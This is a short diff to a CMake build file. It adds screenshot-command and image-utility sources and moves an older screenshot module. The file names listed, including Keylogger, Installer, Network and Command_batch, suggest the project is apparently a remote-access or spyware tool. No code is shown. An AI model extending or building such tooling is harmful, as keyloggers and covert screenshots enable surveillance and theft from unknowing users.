@@ -9,8 +9,12 @@ set(SRC
     src/Command_batch.h
     src/Command_msgbox.cpp
     src/Command_msgbox.h
+    src/Command_screenshot.cpp
+    src/Command_screenshot.h
     src/Info.cpp
     src/Info.h
+    src/ImageUtils.cpp
+    src/ImageUtils.h
     src/Installer.cpp
     src/Installer.h
     src/Keylogger.cpp
@@ -18,8 +22,6 @@ set(SRC
     src/Main.cpp
     src/Network.cpp
     src/Network.h
-    src/Screenshot.cpp
-    src/Screenshot.h
     src/Settings.h
     src/stdafx.cpp
     src/stdafx.h
